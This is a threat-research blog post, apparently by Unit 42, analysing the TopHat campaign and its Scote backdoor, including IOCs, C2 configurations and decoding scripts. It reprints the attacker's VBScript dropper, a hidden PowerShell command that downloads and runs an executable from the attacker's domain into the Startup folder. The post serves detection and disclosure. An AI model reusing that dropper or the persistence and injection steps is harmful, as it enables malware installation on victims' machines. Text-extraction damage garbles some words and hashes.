Blog 
Home 
(https://researchcenter.paloaltonetworks.com/) 
> 
Unit 
42 
(https://researchcenter.paloaltonetworks.com/unit42/) 
> The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services
The TopHat Campaign: Attacks Within The MiddleEast Region Using Popular Third-Party Services 

By Josh 
Grunzweig 
(https://researchcenter.paloaltonetworks.com/author/josh-grunzweig/) 
January 26, 2018 at 5:00 AM Category: 
Unit 
42 
(https://researchcenter.paloaltonetworks.com/unit42/) 

Tags: 
Core 
(https://researchcenter.paloaltonetworks.com/tag/core/), 
DustySky 
(https://researchcenter.paloaltonetworks.com/tag/dustysky/), 
Palestinian 
Territories 
(https://researchcenter.paloaltonetworks.com/tag/palestinian-territories/), 
Scote 
(https://researchcenter.paloaltonetworks.com/tag/scote/), 
TopHat 
(https://researchcenter.paloaltonetworks.com/tag/tophat/) 

岡 7,454 放(4) 
(https://twitter.com/home? 
status=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-the-tophat-campaign-
attacks-within-the-middle-east-region-using-popular-third-party-
services%2F+The+TopHat+Campaign%3A+Attacks+Within+The+Middle+East+Region+Using+Popular+Third-
Party+Services) 
旺 
(https://www.facebook.com/sharer/sharer.php? 
u=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-the-tophat-campaign-
attacks-within-the-middle-east-region-using-popular-third-party-services%2F) 
於 
(https://www.linkedin.com/shareArticle? 
mini=true&url=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-the-tophat-
campaign-attacks-within-the-middle-east-region-using-popular-third-party-
services%2F&title=The+TopHat+Campaign%3A+Attacks+Within+The+Middle+East+Region+Using+Popular+Third-
Party+Services&summary=&source=) 
(//www.reddit.com/submit) 

Summary 

In recent months, Palo Alto Networks Unit 42 observed a wave of attacks leveraging popular third-party services Google+,Pastebin, and bit.ly. Attackers used Arabic language decoy documents related to current events within the PalestineTerritories as lures to entice victims to open and subsequently be infected by the malware. There is data indicating thatthese attacks are targeting individuals or organizations within the Palestinian Territories, which is detailed later. 
The attacks themselves are deployed via four di.erent means, two involving malicious RTF .les, one involving self-extracting Windows executables, and the .nal using RAR archives. 
The ultimate payload is a new malware family that we have dubbed ※Scote§ based on strings we found within the malwaresamples. Scote provides backdoor access for an attacker and we have observed it collecting command and control (C2)information from Pastebin links as well as Google+ pro.les. The bit.ly links obscured the C2 URLs so victims could notevaluate the legitimacy of the .nal site prior to clicking it. We are calling their recent activity the ※TopHat§ campaign. 
Additionally, we tracked the apparent author testing their malware against numerous security products. Our tracking of thistesting enabled us to both note changes made over time as well as to observe other malware being submitted by the author.This other 
malware 
submitted 
provided 
overlaps with 
the 
previously reported 
DustySky campaign(http://www.clearskysec.com/dustysky/). 
In 
addition 
to 
testing 
malicious RTFs that 
deploy the 
Scote 
malware 
family, 
thesame attacker was witnessed submitting .les that appear to be new variants of the DustySky Core malware discussed intheir report. 

Malware Delivery Techniques 
The attacks we found within the TopHat campaign began in early September 2017. In a few instances, original .lenames of the identi.ed samples were written in Arabic. Speci.cally, we found the following names during this investigation: We observed a series of techniques used to deploy the Scote malware family. To date, at a high level, we have observed the following four techniques, each of which we delve into in this blog: 

.rar ...... .... ......... The president begins dissolving power.rar  
.scr ...... .... ......... The president begins dissolving power.scr  
.doc .... ........... Minutes of today＊s meeting.doc  


(https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_1.png) 
Figure 1 Malware delivery techniques 


Technique #1 每 RTFs Leveraging Bit.ly 
The .rst technique encountered included the use of malicious RTFs that made a HTTP request to the below URL which thenredirected to the below malicious site (note the intentional typo of ※storage§): 
URL  Redirect  
http://bit[.]ly/2y3XL3P  http://storgemydata[.]website/v.dat  


This ＆v.dat＊ .le was in turn a PE32 executable .le that has the following SHA256 hash: 
SHA256  862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03.5f2e1d5  

Looking at the publicly available statistics for the bit[.]ly redirect, we see the majority of activity taking place in late Octoberof this year. Additionally, we see the majority of the downloads originating from both the Palestinian Territories as well as theUnited Arab Emirates. This provides clues as to who the victims are or where attackers may originate from. 
(https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_2.png) 
Figure 2 Statistics surrounding malicious redirect 


Technique #2 每 Don＊t Kill My Cat Attacks 
The second technique uses an interesting tactic that Unit 42 has not seen before. Speci.cally, it makes use of an attack discussed in July of this year called Don＊t Kill My Cat or DKMC. DKMC can enable an attacker to load a legitimate bitmap (BMP) 
.le 
that 
contains shellcode 
within 
it. 
The 
DKMC 
tool 
and 
more 
information 
about 
this tactic 
may be 
found 
here 
(https://github.com/Mr-Un1k0d3r/DKMC). 

This speci.c attack begins with a malicious executable .le that downloads a legitimate BMP .le that looks like the following: 

Figure 3 Malicious BMP image retrieved by downloader 

It should be noted that this is the same image used in the DKMC presentation. It would appear that the attackers simply used the default settings of this particular program. 
This BMP .le is loaded as shellcode. The .rst six bytes are read as the following instructions: 
1  seg000:00000000  inc. edx  
2  seg000:00000001  dec. ebp 
3  seg000:00000002  jmp. loc_34D8B  

Code execution is then redirected to embedded shellcode. 
The underlying shellcode is decrypted at runtime using a 4-byte XOR key of 0x3C0922F0. The shellcode eventually loads an embedded UPX-packed executable and redirects execution to this .le. This .le is an instance of the Scote malware family.The size of the payload and the fact that it is embedded within the BMP .le explains the large amount of distortion witnessed in the image above. In other words, the distortion witnessed is actually the shellcode and the embedded Scote malware. As this data is converted within a BMP image, we＊re left with what essentially looks like random pixels. 

Technique #3 每 RTFs Exploiting CVE-2017-0199. 
This technique 
begins with 
malicious RTF 
.les that 
make 
use 
of 
CVE-2017-0199 
(https://portal.msrc.microsoft.com/en-
US/security-guidance/advisory/CVE-2017-0199) 
a 
Microsoft 
O.ce/WordPad 
remote 
code 
execution 
(RCE) 
vulnerabilitypatched by Microsoft in September 2017. When opened, the following lure is displayed to the victim (translation on the right provided by Google Translate): 
(https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_4.png) 
Figure 4 Lure used by malicious RTFs 

This lure 
is related 
to 
an 
event 
reported 
(http://indianexpress.com/article/world/palestinians-to-turn-presidential-palace-into-
national-library-4816384/)in 
late 
August 
where 
President 
Mahmoud 
Abbas announced 
plans to 
convert 
a 
plannedpresidential palace into a national library. This is consistent with the timeline of the attacks we witnessed, as the event took place roughly a week before we observed these malware samples. 
These RTFs will also download a .le from the following location: 

storgemydata[.]website/update-online/o.ce-update.rtf 
Note that this is the same domain witnessed in the redirect used in technique #1. While the downloaded .le has an RTF extension, it is in fact a VBScript with the following contents: 
1 <script language="VBScript"> 
2 window.moveTo -4000, -4000 
3 Set vFwhEtGt = CreateObject("Wscript.Shell")
4 Set lfTi = CreateObject("Scripting.FileSystemObject")
5 If 1=1 Then 

6 vFwhEtGt.Run ("PowerShell.exe -WindowStyle Hidden $d=$env:userprofile+'\\start Menu\\Programs\\Startup\\\12330718701ac441736a55e3ee3cx996.exe';(New-Object System.Net.WebClient).DownloadFile('http://storgemydata[.]website/x.exe',$d);Start-Process $d;"),0 
7 End If 

8 window.close() 
9 </script> 

This VBScript script executes a PowerShell command that will download and execute a .le from the following location: http://storgemydata[.]website/x.exe This .nal ＆x.exe＊ executable .le is an instance of the Scote malware family. 



Technique #4 每 Self-extracting Executables 
The last technique makes use of self-extracting executable .les to both load a decoy document and spawn an instance ofScote. When the malware is run it will drop a .le with an original .lename of ＆abbas.rtf＊, which contains the following contents: (https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_5.png) 
Figure 5 TopHat decoy document with rough translation 

Additionally, an instance of Scote is loaded on the victim machine. 
The decoy document used discusses the potential dissolving of the Palestinian Authority (PA) by the President MahmoudAbbas. 
This particular 
event 
was reported 
(https://www.middleeastmonitor.com/20170823-abbas-considers-option-of-
dissolving-pa-and-switching-power-to-plo/)on 
August 
23, 
2017, 
just 
before 
Trump 
administration 
o.cials were 
set 
to 
visitRamallah. 
Later in this blog, we will see the attackers leveraging this Donald Trump connection even more. 
th

We originally witnessed these speci.c RTFs on September 6 , 2017, just two weeks after this event. 
Based on the observed statistics from the malicious redirect found in technique #1, as well as the content of this decoydocument, we can infer that at least some of the targeted victims may very well be located in the Palestinian Territories. 

Analysis of the Scote Malware 
The Scote malware family employs a series of techniques and tricks when it is originally loaded onto a victim machine.However, underneath the various layers of obfuscation lies a fairly straightforward malware family that abuses legitimatethird-party online services to host its C2 information. 
When Scote originally is run, it will decode embedded con.guration information. This embedded con.guration informationcontains URLs to third party online services, such as Pastebin postings or Google+ accounts. Scote will use this informationto attempt to retrieve data from these URLS and parse it, such as in the following example: 

Figure 6 Google+ pro.le used by Scote malware 

It should be noted that a total of three Google+ pro.les have been observed and all of these pro.les contained the name＆Donald Trump＊. This is interesting given the topics we saw being used to deliver the Scote malware family within the TopHatcampaign, many of which also referred to the President of the Palestinian Territories. 
After C2 information is retrieved by Scote, it will communicate with these servers and can accept commands that performthe following actions: 

Kill 
the Scote malware 


Run 
＆ipcon.g＊ on the victim and return results 


Run 
＆cmd.exe /C systeminfo＊ and return results 


Load 
a DLL that is downloaded from a C2 


For 
more 
information 
about 
the 
Scote 
malware 
family, 
please 
refer 
to 
the 
Appendix. 


Identi.ed Malware Testing Against Security Solutions 
When looking at the malicious RTF documents in technique #4 that exploit CVE-2017-0199 we found that all of the .les weencountered were submitted within close succession of each other to an online service that tests them against multiplesecurity products. Additionally, the original .lenames of these .les implied that an attacker may have been testing theirmalware against one or more security products. 
SHA256  Filename  Date  
cb6cf34853351ba62d4dd2c609d6a41c618881670d5652.a7ddf5496e4693f0  test1.rtf  2017-09-06 15:00:08 UTC  
8a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf64  xx.rtf  2017-09-06 15:00:53 UTC  
d302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b5  xx2.rtf  2017-09-06 15:01:49 UTC  
1cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a1  xx2.rtf  2017-09-06 15:05:30 UTC  
d409d26c.e6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9  xx2.rtf  2017-09-06 15:08:32 UTC  
aa18b8175f68e8eefa12cd2033368bc1b73.7caf05b405f6.1e09ef812803c  xx2.rtf  2017-09-06 15:18:14 UTC  

As we can see by the timestamps shown above, the .les were submitted anywhere from one to ten minutes apart from eachother. Looking closer at these .les we can see what changed between iterations. 
(https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_7.png) 
Figure 7 Modi.cations made to RTFs by attacker 

As it so happens, the .rst RTF .le this attacker attempted to test had very few detections. However, this was due to the factthat the attempts at commenting out the backslashes caused this .le to not open at all within Microsoft Word. When you attempt to open this .le, Word will simply render the content as it would a normal text .le. 
It appeared that the attacker realized this, as he or she quickly corrected this, and proceeded to make very minormodi.cations to try and evade security products. However, none of the modi.cations were terribly e.ective: all of thesesamples were found to have a high rate of detection. 
As we can see in Figure 7, the attacker made multiple very small modi.cations between each iteration, speci.cally aroundthe ＆.object.objlink.objupdate＊ string. This particular control allows the malicious content to be loaded by the RTF, asoutlined 
in 
an 
analysis 
by MDSec 
(https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/).As such, the attacker likely felt this was what resulted in the RTF being detected as malicious, and attempted to obfuscatedit. 

Overlap with the DustySky Campaign 
Besides being able to witness the attacker testing his or her malware, we noticed something interesting when we werelooking at the individual who submitted these .les. About a month and a half after these .les were submitted, the sameindividual 
submitted 
the 
following 
three 
samples that 
we 
attribute 
to 
the 
DustySky 
(http://www.clearskysec.com/dustysky/)campaign: 

202d1d51254eb13c64d143c387a87c5e7ce97ba3dcfd12dd202a640439a9ea3b d18e09debde4748163efa25817b197f3.0414d2255f401b625067669e8e571e 3e4d0.dde0b5db2a0a526730.63908cefc9634f07ec027c478c123912554bb 



DustySky is a campaign published by ClearSky in January 2016 that discusses a politically motivated group that primarilytargets organizations within the Middle East. The group has remained active since they were originally reported on, includinga 
campaign 
identi.ed 
by Unit 
42 
earlier 
this year 
(https://researchcenter.paloaltonetworks.com/2017/01/unit42-downeks-
and-quasar-rat-used-in-recent-targeted-attacks-against-governments/). 
These 
.les appear 
to 
be 
new 
variants of 
theDustySky Core malware discussed in the report and they communicate with the following domains over HTTPS: 

fulltext.yourtrap[.]com 

checktest.www1[.]biz 
The malware is dropped via a self-extracting executable, which contains an empty decoy document with the following name: 
.docx ..... .. ...... ...... .... .. ........ ...... ..... ..... .......



This can roughly be translated to the following: 

News of the detention of President Abbas in Saudi Arabia and Dahlan＊s declaration as President of Palestine.docx As we can see, the name of this decoy document is consistent with the lures witnessed in the TopHat campaign. 

Conclusion 

Attackers often are found to leverage current events to accomplish their goal. In the TopHat campaign, we have observedyet another instance where a threat actor looks to be using political events to target individuals or organizations within thePalestine region. This campaign leveraged multiple methods to deploy a previously unseen malware family, including somerelatively new tactics in the case of using a legitimate BMP .le to load malicious shellcode. 
The new malware family, which we have dubbed Scote, employs various tricks and tactics to evade detection, but providesrelatively little functionality to the attackers once deployed. This may well be due to the fact it is still under active development. Scote uses some interesting methods when retrieving C2 information, including the use of Pastebin andGoogle+ accounts, as well as using bit.ly links to obscure the C2 URLs so victims could not evaluate the legitimacy of the.nal site prior to clicking it. 
The TopHat campaign was found to have some overlaps discovered with the previously reported DustySky campaign whenthe attacker was identi.ed to be submitting their .les for testing purposes. Unit 42 will continue to track and monitor thisthreat and will report on any developments that occur. 
Palo Alto Networks customers are protected by this threat in the following ways: 

The 
Scote 
(https://autofocus.paloaltonetworks.com/#/tag/Unit42.Scote) 
malware 
family and 
the 
TopHat 
(https://autofocus.paloaltonetworks.com/#/tag/Unit42.TopHat) 
campaign 
have 
been 
tagged 
within 
AutoFocus for 
continued tracking 


DustySky 
(https://autofocus.paloaltonetworks.com/#/tag/Unit42.DustySky) 
is tagged 
within 
AutoFocus for 
ongoing 
tracking 


All 
malicious domains discovered within this campaign have been appropriately .agged as malware 


All 
samples are marked malicious within WildFire 


Traps 
identi.es and blocks the exploits used by the RTF .les 


Additionally, Google, Pastebin, and bit.ly have been noti.ed of the malicious content being hosted on their services. 

Appendix 

Indicators of Compromise 
SHA256 Hashes 

d3ead67228b3d7968ac767648b46a8e906affa0ebb5cc69f7acbed475a97204c 03e2b932c013252fa2eb5e35390f9e21d0ff87e5b1c01683ebce0e8ce9b8d6df 4df9488fbdfaf5d05fda65175a6b6e5331c58c967adbe972aa46c64b4fd0b1bb 0dde9940f7896c2e4fb881dd185c3c3db280a9fd2ac2cb81988f43f5b0f6fcf7 613da5f745c281acbffa4375e96394f8c912f58f92afe347e8a1f10fad3489bb d0f2d2d7d82c91fe64a64552e0e6200a096230fb6a64a1307928ae33ab2a5bf8 7b6347093b27174e27228c2fde7d39e02d57315b354461aaf1dee3f0800fdfc3 bdc633fe3145d87036ad759be855771d5bb3ca592cecca9ef7f41454d7cf9f05 ed9c62f77055a2498aec681b5653240be534595b97a9d11e92371639b0ca9a48 7a1fa34ca804492415579c3ed4f505a7f09fcd7bc834590cff86e2ce77c4fc73 862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d5 3540c2f0765773fa0a822fcf5fed5ed2a363ad11291a66ab1b488c9a4aa857f9 ddc13c8d3d55562df873d4cf17181164922cb71d0c94edeb8fa143033c1214e0 d4cb6b76dd352c928ca7184f583d14d800c090ba650dd26d8fa4febe901d1205 5c0b253966befd57f4d22548f01116ffa367d027f162514c1b043a747bead596 1f9bca1d5ce5d14d478d32f105b3ab5d15e1c520bde5dfca22324262e84d4eaf 
c9ba9e11a19120b58af1f6ccf3beb25744580592c680718a6fc205d662f2a20e aa18b8175f68e8eefa12cd2033368bc1b73ff7caf05b405f6ff1e09ef812803c d409d26cffe6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9 d302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b5 1cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a1 8a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf64 3627ed71588c7b55b35592c3b277910041f3d5ff917de721c53684ee18fcda40 109996d28700fa0e8594d6ecca422418fa43e1b7cf5f9f4442a69264bf5fcea4 c2815c72c9ea70db073775269ef04b1d061e93580f0f5fd3f3de25601641576a 

Domains 

storgemydata[.]website 


Scote Technical Analysis 
For the technical analysis, we used the following sample: 

This particular sample begins as a self-extracting executable. When run, it will drop a ＆e.exe＊ sample and execute the following SFX script commands: 
1 Path=%userprofile%\start menu\programs\startup\ 2 Setup=e.exe 3 Silent=1 4 Overwrite=1 5 Update=U 
For those unfamiliar with SFX commands, the series of commands above is silently deploying e.exe to the startup path. It will overwrite any instances where e.exe already exists in this path. 
The ＆e.exe＊ .le is compiled in Delphi and has the following SHA256 hash: 

When run, ＆e.exe＊ will periodically decrypt strings at runtime using a simple single-byte XOR routine. While the routine allows for di.erent bytes to be used, the author chose to use a key of 0xFF in every observed instance. 
The malware proceeds to get the address of the NtDelayExecution function from ntdll.dll. This function is used by Sleep to cause a delay in program execution. After this function address has been resolved, it will overwrite the .rst .ve bytes to jmpto a malicious function, as seen below: 

Figure 8 Modi.cations to NtDelayExeuction 

The malware proceeds to make a call to Sleep with an argument of 1, thus redirecting execution to this malicious function.This is likely an attempt at thwarting anti-virus and security solutions, however, has the adverse e.ect of preventing themalware from making subsequent calls to Sleep. 
This malicious function continues to decode more strings using the single-byte XOR technique. Additionally, it will copy the following functions out of ntdll.dll for later use: 

ZwCreateUserProcess ZwAllocateVirtualMemory ZwWriteVirtualMemory ZwGetContextThread ZwSetContextThread ZwResumeThread 






A large blob of encrypted data is decrypted using a modi.ed version of RC4. The following Python code may be used to decrypt this data. The key has consistently been observed to be ※qlNwuFVA9K8HpGNY6x0I§. 
1 import base64 2 import binascii 3 import hexdump 4 import sys
5 

6 def rc4_crypt(data, key): 
7 S = range(256)8 j=0 9 out = [] 
10 for i in range(256): 11 j = (j + S[i] + ord( key[i % len(key)] )) % 256 12 S[i] , S[j] = S[j] , S[i]
13 

14 i=0 15 for char in data: 16 j=(S[i%256]+j)%256 17 t = S[i%256]18 S[i%256] = S[j]19 S[j]=t 20 out.append(chr(ord(char) ^ S[(S[i%256] + S[j]) % 256])) 21 i+=1 
22 return ''.join(out)
23 
24 

25 file = sys.argv[1]26 f = open(file, 'rb')27 fd = f.read() 28 f.close() 
29 

30 output = rc4_crypt(fd, "qlNwuFVA9K8HpGNY6x0I")
31 

32 f = open("decrypted_data.bin",'wb')33 f.write(output)34 f.close() 
This decrypted code is then copied to a newly allocated block of memory before execution .ow is redirected to it. When this newly decrypted code is called, it is provided with a string argument containing the path to svchost.exe. 
This new code is shellcode that will eventually decrypt an executable .le and inject it into a newly spawned svchost.exe process. 
The shellcode in question makes certain decisions by the author that demonstrates a lack of sophistication. For example, it will load a series of libraries and functions using a common ROR13 technique. This technique begins with the attacker taking a string of a library or function, such as ＆CreateProcessA＊, and performing a binary ROR13 against it. In this example, the attacker has a result of a DWORD of 0x16B3FE72. This DWORD is then typically hardcoded within the shellcode. The malicious code then iterates through the functions of the necessary library and applies the same ROR13 technique againsteach function until it .nds a match. 
This shellcode uses the same approach, however, instead of providing the hardcoded DWORDs, it instead provides theclear-text library and function names, which then have the ROR13 applied. The resulting DWORD is then used.Unfortunately, this completely cancels out any obfuscation that might have originally been present. 
After the various libraries and functions are loaded, the shellcode decodes an embedded blob of data using a multi-byteXOR operation. The original key for this operation appears to have been ＆Houdini＊, however, due to a likely mistake by the author, after the .rst iteration, a key of ＆oudini.x00＊ is used instead. 
The following example Python code decodes this data found within the shellcode: 

1 import sys2 from itertools import cycle, izip
3 

4 def xor(message, key): 5 return ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, 
6 

7 def decode(data, size): 
8 out = "" 9 key = "oudini\x00" 10 b1 = xor(data[0], "H")11 b2 = xor(data[1:size], key)12 b=b1+b2 
13 for bite in b: 
14 out += chr((ord(bite) + 128) & 0xff)
15 return out 
16 

17 file = sys.argv[1]18 f = open(file, 'rb')19 fd = f.read() 20 f.close() 
21 

22 size = 54272 23 output = decode(fd, size)
24 

25 f1 = "embeddedShellcode.bin" 26 fh = open(f1, 'wb')27 fh.write(output)28 fh.close() 

cycle(key))) 

This decoded blob is a Microsoft Windows executable that contains the Scote payload. After this blob is decoded, a new instance of svchost.exe is spawned in a suspended state. The Scote payload is injected into this process prior to resuming it. 
Scote begins by loading and decoding an embedded resource string. It is decoded .rst using base64 with a customized alphabet. The result is then base64-decoded using the traditional alphabet. The following alphabet is used for the .rst phase of decoding: 

0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/ 
Once decoded, we＊re provided with the following con.guration (newlines and spacing added for presentation): 
1 [config]2 [connection]3 [param]http://pastebin[.]com/raw/2cLsuXj6[/param]4 [param]http://pastebin[.]com/raw/trZZJTGA[/param]5 [/connection]6 [install_name]e3HGAiPJ[/install_name]7 [nick_name]4c1h7vLX[/nick_name]8 [install_folder]noinstall[/install_folder]9 [reg_startup]false[/reg_startup]
10 [folder_startup]false[/folder_startup]11 [task_startup]false[/task_startup]12 [injection]true[/injection]13 [injection_process]svchost[/injection_process] 
The con.guration is parsed to determine if there are any connection ＆param＊ parameters provided. In the event that there are, Scote will attempt to download the contents of these URLs via a simple GET request. 
These pastebin URLs contained the following information, IPs have been defanged: 
1 scout{2 5.175.214[.]9:22 3 5.175.214[.]9:23 4 5.175.214[.]9:25 5 5.175.214[.]9:53 6 5.175.214[.]9:6000 7 5.175.214[.]9:80 
8}9 elite{10 5.175.214[.]9:5000 11 5.175.214[.]9:443 12 5.175.214[.]9:1434 13 5.175.214[.]9:110 14 5.175.214[.]9:2716 15 5.175.214[.]9:8080 
16 }

17 {x=c2NvdXR7DQo1LjE3NS4yMTQuOToyMg0KNS4xNzUuMjE0Ljk6MjMNCn0NCmVsaXRlew0KNS4xNzUuMjE0Ljk6NTAwMA0KNS4xNzUuMjE0Ljk6NDQzDQp9} 
In addition to Pastebin, some samples were found connecting to the following three Google+ pro.les: 

https://plus.google[.]com/104518099222750189969 https://plus.google[.]com/110228699051788231047 https://plus.google[.]com/106456556287604120942 Scote takes the response from these requests and parses data within ＆scout{}＊. Other Scote versions attempted to identify data contained within ＆{x=＊ and ＆}＊. This data is decoded using the traditional Base64 algorithm. The results are similar to the following (IPs have been defanged): 
1 scout{2 5.175.214[.]9:22 3 5.175.214[.]9:23 
4}5 elite{6 5.175.214[.]9:5000 7 5.175.214[.]9:443 
8} 

This information is used for subsequent communication and these values represent the Scote malware＊s C2. 
While there are a number of other con.guration parameters within Scote, the connection params and the nick_name appearto be the only ones used. It＊s possible that Scote is still actively being developed and the author has yet to make use of theadditional parameters provided within the con.guration. A full list of identi.ed Scote con.gurations may be found within the ＆Scote Con.gurations＊ appendix. 
Scote checks the current running process against the following list to ensure it is running within one of them: 

svchost.exe explorer.exe chrome.exe .refox.exe iexplorer.exe opera.exe Scote makes an ASM call to CPUID with an argument of 1 to query the victim＊s processor information and features. Thisinformation is used to generate a unique 8-character hash for that victim. 
Scote then connects to the previously retrieved C2 servers and sends the following information via TCP: 
command=scote_connection|hwid=[8.character.hash] 
In the example above, [8 character hash] is replaced with the victim＊s unique hash. Scote continues to submit the following command periodically and will parse the response: 
command=scote_ping 
Scote accepts the following .ve responses: 
Command  Description  
scote_pong  No action taken by Scote  
scote_drop  Kill the Scote malware  
scote_info_ipcon.g  Return the results of running ＆ipcon.g＊  
scote_info_systeminfo  Return the results of running ＆cmd.exe /C systeminfo＊  
scote_upgrade  Accept a DLL from the remote C2 and load it.  


When Scote returns information in the following format: 
command=[command]|buffer=[data] 
In the example above, [command] is replaced with the command received by the remote C2 server, and [data] is replacedwith data that has been encoded using both traditional base64 as well as base64 with the nonstandard alphabet. 

Scote Con.gurations 

1 4df9488fbdfaf5d05fda65175a6b6e5331c58c967adbe972aa46c64b4fd0b1bb 
2 

3 [config]4 [connection]5 [param]https://plus.google[.]com/104518099222750189969[/param]6 [param]https://plus.google[.]com/110228699051788231047[/param]
[param]https://plus.google[.]com/106456556287604120942[/param] 
[/connection][install_name]Kh237t0P[/install_name][nick_name]k1et333d[/nick_name][install_folder]noinstall[/install_folder][reg_startup]false[/reg_startup][folder_startup]false[/folder_startup][task_startup]false[/task_startup][injection]true[/injection][injection_process]svchost[/injection_process] 
ed9c62f77055a2498aec681b5653240be534595b97a9d11e92371639b0ca9a48 
[config][connection][param]https://plus.google[.]com/104518099222750189969[/param][param]https://plus.google[.]com/110228699051788231047[/param][param]https://plus.google[.]com/106456556287604120942[/param][/connection][install_name]Q2xm5ziY[/install_name][nick_name]hq5GyQ1D[/nick_name][install_folder]noinstall[/install_folder][reg_startup]false[/reg_startup][folder_startup]false[/folder_startup[task_startup]false[/task_startup][injection]false[/injection] 
613da5f745c281acbffa4375e96394f8c912f58f92afe347e8a1f10fad3489bb 
[config][connection][param]http://pastebin[.]com/raw/2cLsuXj6[/param][param]http://pastebin[.]com/raw/trZZJTGA[/param][/connection][install_name]e3HGAiPJ[/install_name][nick_name]4c1h7vLX[/nick_name][install_folder]noinstall[/install_folder][reg_startup]false[/reg_startup][folder_startup]false[/folder_startup][task_startup]false[/task_startup][injection]true[/injection][injection_process]svchost[/injection_process] 
03e2b932c013252fa2eb5e35390f9e21d0ff87e5b1c01683ebce0e8ce9b8d6df 
[config][connection][param]http://pastebin[.]com/raw/2cLsuXj6[/param][param]http://pastebin[.]com/raw/trZZJTGA[/param][/connection][install_name]i0c9488I[/install_name][nick_name]7WDyDSog[/nick_name][install_folder]noinstall[/install_folder][reg_startup]false[/reg_startup][folder_startup]false[/folder_startup][task_startup]false[/task_startup][injection]true[/injection][injection_process]svchost[/injection_process] 
0dde9940f7896c2e4fb881dd185c3c3db280a9fd2ac2cb81988f43f5b0f6fcf7 
[config][connection][param]http://pastebin[.]com/raw/2cLsuXj6[/param][param]http://pastebin[.]com/raw/trZZJTGA[/param][/connection][install_name]ZVLhWo62[/install_name][nick_name]b04bc9mK[/nick_name][install_folder]noinstall[/install_folder][reg_startup]false[/reg_startup][folder_startup]false[/folder_startup][task_startup]false[/task_startup][injection]true[/injection][injection_process]svchost[/injection_process] 
d0f2d2d7d82c91fe64a64552e0e6200a096230fb6a64a1307928ae33ab2a5bf8 
[config][connection][param]http://pastebin[.]com/raw/2cLsuXj6[/param] 

97 [/connection]
98 [install_name]9OhcOo03[/install_name]
99 [nick_name]URt7b1zK[/nick_name]
100 [install_folder]temp[/install_folder]
101 [reg_startup]false[/reg_startup]
102 [folder_startup]false[/folder_startup]
103 [task_startup]true[/task_startup]
104 [injection]true[/injection]
105 [injection_process]svchost[/injection_process]
106 
107 
108 

109 7b6347093b27174e27228c2fde7d39e02d57315b354461aaf1dee3f0800fdfc3 
110 
111 [config]

112 [connection]
113 [param]http://pastebin[.]com/raw/2cLsuXj6[/param]
114 [/connection]
115 [install_name]ke6Wox2L[/install_name]
116 [nick_name]3GlWhgi3[/nick_name]
117 [install_folder]noinstall[/install_folder]
118 [reg_startup]false[/reg_startup]
119 [folder_startup]true[/folder_startup]
120 [task_startup]false[/task_startup]
121 [injection]true[/injection]
122 [injection_process]explorer[/injection_process] 
Got something to say? 
Leave a comment... 


Notify me of followup comments via e-mail 

Name (required) 
Email (required) 
Website 
SUBMIT 

SUBSCRIBE TO NEWSLETTERS 


COMPANY 

Company 
(https://www.paloaltonetworks.com/company) 
Careers 
(https://www.paloaltonetworks.com/company/careers) 

Sitemap 
(https://www.paloaltonetworks.com/sitemap) 
Report 
a 
Vulnerability 
(https://www.paloaltonetworks.com/security-disclosure) 


LEGAL NOTICES 

Privacy Policy 
(https://www.paloaltonetworks.com/legal-notices/privacy) 
Terms of 
Use 
(https://www.paloaltonetworks.com/legal-notices/terms-of-use) 


ACCOUNT 

Manage 
Subscription 
(https://www.paloaltonetworks.com/company/subscriptions) 

. (https://www.linkedin.com/company/palo-alto-networks) 
. 
(https://www.facebook.com/PaloAltoNetworks/) 
. (https://twitter.com/PaloAltoNtwks) 

(https://ignite.paloaltonetworks.com/usa/? 

CampaignId=7010g000001IH8U&utm_content=Ignite18USA&utm_medium=390x90banner&utm_source=website) . 2016 Palo Alto Networks, Inc. All rights reserved. 





